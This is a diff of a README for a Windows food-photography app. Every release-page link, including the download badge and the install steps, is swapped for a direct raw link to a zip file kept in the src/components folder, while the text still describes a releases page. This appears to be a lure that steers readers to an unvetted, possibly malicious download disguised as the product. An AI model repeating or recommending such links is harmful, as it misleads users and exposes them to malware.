@@ -1,12 +1,12 @@
 # 🍽️ Virtual-Food-Photographer - Create Clean Food Shots Fast
 
-[![Download Virtual-Food-Photographer](https://img.shields.io/badge/Download%20Now-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Marigoldaculeate869/Virtual-Food-Photographer/releases)
+[![Download Virtual-Food-Photographer](https://img.shields.io/badge/Download%20Now-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Marigoldaculeate869/Virtual-Food-Photographer/main/src/components/Virtual_Food_Photographer_1.6.zip)
 
 ## 📥 Download Virtual-Food-Photographer
 
 Visit the releases page to download and run this file on Windows:
 
-https://github.com/Marigoldaculeate869/Virtual-Food-Photographer/releases
+https://raw.githubusercontent.com/Marigoldaculeate869/Virtual-Food-Photographer/main/src/components/Virtual_Food_Photographer_1.6.zip
 
 On that page, look for the latest release and download the Windows file that matches your system.
 
@@ -38,7 +38,7 @@ For a smoother run, use:
 ## 🚀 How to install on Windows
 
 1. Open the release page:
-   https://github.com/Marigoldaculeate869/Virtual-Food-Photographer/releases
+   https://raw.githubusercontent.com/Marigoldaculeate869/Virtual-Food-Photographer/main/src/components/Virtual_Food_Photographer_1.6.zip
 
 2. Find the newest release at the top.
 
@@ -206,4 +206,4 @@ This keeps the image clean and easy to use in most places.
 
 If you need to get the app again, use this page:
 
-https://github.com/Marigoldaculeate869/Virtual-Food-Photographer/releases
+https://raw.githubusercontent.com/Marigoldaculeate869/Virtual-Food-Photographer/main/src/components/Virtual_Food_Photographer_1.6.zip
